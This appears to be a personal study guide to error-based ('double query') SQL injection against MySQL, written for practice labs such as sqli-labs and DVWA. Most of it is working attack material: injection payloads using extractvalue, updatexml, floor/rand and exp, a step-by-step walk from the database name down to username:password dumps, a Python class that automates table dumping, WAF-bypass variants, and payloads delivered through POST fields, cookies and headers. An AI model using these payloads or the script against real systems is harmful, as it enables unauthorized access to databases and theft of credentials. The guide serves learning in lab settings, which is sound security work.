# Double Query Injectioncomplete guide

## Part 1: Theoretical Foundation

### 1.1 What is Double Query Injection?

Double Query Injection（also known asError-based Injection）is a SQL Injectiontechniques，Throughconstruct special SQL statements，triggerdatalibraryerror，andexploitationError messageExtract data。

**Core Principle**:
- Database throws errors when executing specially crafted statements
- Error messages may contain query results
- Sensitive information is obtained by extracting data from error messages

---

## Part 2: Technical Classification

### 2.1 XML Function Errors (MySQL 5.1.5+)

#### A. extractvalue() functions
```sql
-- Basic syntax
extractvalue(XML_document, XPath_string)

-- Injection Payload
' and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+

-- Principle: XPath parameter must be a valid XPath expression, 0x7e (~) is not valid, triggering error
-- Error message：XPATH syntax error: '~security~'
```

**Actual Test (Command Line)**:
```bash
$ mysql -u root -p'security-platform.cn' -e "SELECT extractvalue(1,'~security~');"
ERROR 1105 (HY000): XPATH syntax error: '~security~'
```

**Conclusion**: extractvalue() throws error when directly given invalid XPath

#### B. updatexml() functions
```sql
-- Basic syntax
updatexml(XML_document, XPath_string, new_value)

-- Injection Payload
' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+

-- Principle: Similar to extractvalue()
-- Error message：XPATH syntax error: '~security~'
```

**Actual Test**：
```bash
$ mysql -u root -p'security-platform.cn' -e "SELECT updatexml(1,'~security~',1);"
ERROR 1105 (HY000): XPATH syntax error: '~security~'
```

**Conclusion**: updatexml() is also usable

---

### 2.2 Mathematical Function Errors

#### A. floor() + rand() + group by（classic method）
```sql
-- Basic syntax
SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x
FROM information_schema.tables GROUP BY x;

-- Injection Payload
' and (select 1 from(select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)--+

-- Principle：
-- 1. floor(rand(0)*2) produces sequence of 0 or 1
-- 2. GROUP BY evaluates rand() multiple times when computing keys
-- 3. Duplicate entry error triggered when key conflicts occur
-- Error message：Duplicate entry 'security1' for key 'group_key'
```

**Actual Test**：
```bash
$ mysql -u root -p'security-platform.cn' security -e "
SELECT 1 FROM (
  SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x
  FROM information_schema.tables
  GROUP BY x
)a;
"
ERROR 1062 (23000): Duplicate entry 'security1' for key 'group_key'
```

**Conclusion**: floor()+rand() method works, database name is security

#### B. exp() functions（MySQL 5.5+）
```sql
-- Basic syntax
exp(~(SELECT * FROM (SELECT database())a))

-- Injection Payload
' and exp(~(select * from(select database())a))--+

-- Principle：
-- 1. exp(x) calculates e^x
-- 2. When x exceeds 709, result exceeds DOUBLE range
-- 3. ~ (bitwise NOT) turns positive numbers into huge negative numbers
-- Error message：DOUBLE value is out of range
```

**Actual Test**：
```bash
$ mysql -u root -p'security-platform.cn' -e "SELECT exp(~(SELECT * FROM (SELECT database())a));"
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~(select database() from dual))'
```

**Conclusion**: exp() method works, but error message doesn't contain data

---

### 2.3 Geometry Function Errors

#### geometrycollection() / polygon() / linestring() / multipoint()
```sql
-- Injection Payload
' and geometrycollection((select * from(select * from(select database())a)b))--+

-- Principle: Geometry function parameter type mismatch
-- Error message：Illegal parameter type
```

---

## Part 3: Practical Application

### 3.1 Data Extraction Flow

#### Step 1: Extract Database Name
```sql
-- extractvalue()
?id=1' and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+
Error: XPATH syntax error: '~security~'

-- floor()+rand()
?id=1' and (select 1 from(select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
Error: Duplicate entry 'security1' for key 'group_key'
```

#### Step 2: Extract All Databases
```sql
?id=1' and extractvalue(1,concat(0x7e,(SELECT group_concat(schema_name) FROM information_schema.schemata),0x7e))--+
Error: XPATH syntax error: '~information_schema,mysql,performance_schema,security~'
```

#### Step 3: Extract Table Names
```sql
?id=1' and extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='security'),0x7e))--+
Error: XPATH syntax error: '~emails,referers,uagents,users~'
```

#### Step 4: Extract Column Names
```sql
?id=1' and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--+
Error: XPATH syntax error: '~id,username,password,level,id~'
```

#### steps 5: Extract data
```sql
?id=1' and extractvalue(1,concat(0x7e,(SELECT concat(username,':',password) FROM users LIMIT 0,1),0x7e))--+
Error: XPATH syntax error: '~Dumb:Dumb~'
```

---

### 3.2 Length Limit Bypass

**Issue**: extractvalue() and updatexml() can only display up to 32 characters

**Solutions**:
```sql
-- Method 1: Use substr() for segmented extraction
?id=1' and extractvalue(1,concat(0x7e,(SELECT substr(group_concat(username,':',password),1,30) FROM users),0x7e))--+

-- Method 2: Use limit for row-by-row extraction
?id=1' and extractvalue(1,concat(0x7e,(SELECT concat(username,':',password) FROM users LIMIT 0,1),0x7e))--+
?id=1' and extractvalue(1,concat(0x7e,(SELECT concat(username,':',password) FROM users LIMIT 1,1),0x7e))--+
...
```

---

## Part 4: Automation Scripts

### 4.1 Python Automated Extraction Tool

```python
#!/usr/bin/env python3
import requests
from urllib.parse import quote
import re

class ErrorBasedSQLi:
    def __init__(self, url, quote_type="'"):
        self.url = url
        self.quote_type = quote_type

    def extract_with_extractvalue(self, query):
        """Using extractvalue() Extract data"""
        payload = f"1{self.quote_type} and extractvalue(1,concat(0x7e,({query}),0x7e))--+"
        r = requests.get(f"{self.url}?id={quote(payload)}")

        if "XPATH syntax error" in r.text:
            match = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<\n]+)', r.text)
            if match:
                return match.group(1).strip()
        return None

    def extract_with_floor(self, query):
        """Using floor()+rand() Extract data"""
        payload = f"1{self.quote_type} and (select 1 from(select count(*),concat(({query}),floor(rand(0)*2))x from information_schema.tables group by x)a)--+"
        r = requests.get(f"{self.url}?id={quote(payload)}")

        if "Duplicate entry" in r.text:
            match = re.search(r"Duplicate entry '([^']+)'", r.text)
            if match:
                # Remove trailing 0 or 1
                return match.group(1).rstrip('01')
        return None

    def get_database(self):
        """Get current database"""
        return self.extract_with_extractvalue("SELECT database()")

    def get_tables(self, db_name):
        """Get all tables from specified database"""
        query = f"SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='{db_name}'"
        return self.extract_with_extractvalue(query)

    def get_columns(self, table_name):
        """Get all columns from specified table"""
        query = f"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{table_name}'"
        return self.extract_with_extractvalue(query)

    def dump_table(self, table_name, columns, limit=10):
        """Extract table data"""
        for i in range(limit):
            query = f"SELECT concat({columns}) FROM {table_name} LIMIT {i},1"
            result = self.extract_with_extractvalue(query)
            if result:
                print(f"[+] Row {i}: {result}")
            else:
                break

# Usingexamples
if __name__ == "__main__":
    sqli = ErrorBasedSQLi("http://localhost/sqli-labs/Less-5/")

    print("[*] Extract datalibrary...")
    db = sqli.get_database()
    print(f"[+] Database: {db}")

    print("\n[*] Extracting tables...")
    tables = sqli.get_tables(db)
    print(f"[+] Tables: {tables}")

    print("\n[*] Extracting columns from users table...")
    columns = sqli.get_columns("users")
    print(f"[+] Columns: {columns}")

    print("\n[*] Extracting users table data (first 5 rows)...")
    sqli.dump_table("users", "concat(username,':',password)", limit=5)
```

---

## Part 5: Advanced Techniques

### 5.1 Bypass WAF

#### A. Keyword Filtering
```sql
-- Mixed case
' and ExtractValue(1,concat(0x7e,(SeLeCt database()),0x7e))--+

-- Double writing
' and extractvalue(1,concat(0x7e,(selselectect database()),0x7e))--+

-- Encoding
' and extractvalue(1,concat(0x7e,(SELECT%20database()),0x7e))--+
```

#### B. Function Filtering
If extractvalue() is filtered, use alternative functions:
- updatexml()
- floor()+rand()+group by
- exp()
- geometrycollection()

### 5.2 Special Scenarios

#### A. POST Injection
```python
# Modify Content-Type
data = {
    "username": "admin' and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+",
    "password": "test"
}
r = requests.post(url, data=data)
```

#### B. Cookie Injection
```python
cookies = {
    "id": "1' and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+"
}
r = requests.get(url, cookies=cookies)
```

#### C. HTTP Header Injection
```python
headers = {
    "User-Agent": "' and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+",
    "Referer": "' and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+"
}
r = requests.get(url, headers=headers)
```

---

## Part 6: Comparison Summary

| Method | Version Requirement | Length Limit | Success Rate | Use Case |
|------|----------|----------|--------|----------|
| extractvalue() | MySQL 5.1.5+ | 32 characters | high | Universal |
| updatexml() | MySQL 5.1.5+ | 32 characters | high | Universal |
| floor()+rand() | Universal | none | medium | Long data |
| exp() | MySQL 5.5+ | none | low | Bypass filtering |
| geometry functions | MySQL 5.x | none | low | Special scenarios |

---

## Part 7: Learning Checklist

### Theory Mastery ✅
- [x] Understand Double Query injection principles
- [x] Master 5 error-based functions
- [x] Understand various closure types

### Practical Skills
- [x] Verified all methods in command line
- [ ] Successfully exploit in web environment
- [ ] Write automated injection scripts
- [ ] Bypass WAF and filtering rules

### Advanced Applications
- [ ] Cross-database error-based injection
- [ ] Second-order injection scenarios
- [ ] Real vulnerability case analysis
- [ ] CTF competition application

---

## Part 8: Environment Configuration Guide

### 8.1 Configure Error Display

**PHP Configuration**:
```php
// Add at the beginning of PHP file
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
```

**MySQL Configuration**:
```sql
-- Check MySQL version
SELECT VERSION();

-- Check if XML functions are supported
SELECT extractvalue(1,'test');
SELECT updatexml(1,'test',1);
```

### 8.2 Recommended Practice Environments

1. **DVWA** (Damn Vulnerable Web App)
   - SQL Injection module
   - Supports error-based injection

2. **Pikachu practice range**
   - "SQL Injection (Error-based)" dedicated practice
   - Chinese interface, easy to understand

3. **PortSwigger Web Security Academy**
   - SQL Injection Lab modules
   - Professional-level teaching

---

## Part 9: Learning Summary

### Key Findings:
1. extractvalue()/updatexml() works in command line
2. ✅ floor()+rand() inCommand Linesuccessfully inExtract data
3. SQLi-Labs environment has limitations (HTTP 500 errors)
4. Need to practice in environments that support error display

### Best Practices:
1. Prefer extractvalue() or updatexml() (most stable)
2. Long dataUsing floor()+rand() methods
3. Bypass filteringtry other functions when
4. Write automation scripts for efficiency

### Next Steps:
1. Deploy DVWA practice range
2. Practice error-based injection in real environments
3. Develop automated injection tools
4. Research WAF bypass techniques

---

**Document Version**: 1.0
**Created**: 2026-03-26
**Status**: Theory mastered, needs practical verification
**Skill Level**: Intermediate to Advanced (needs more practice)
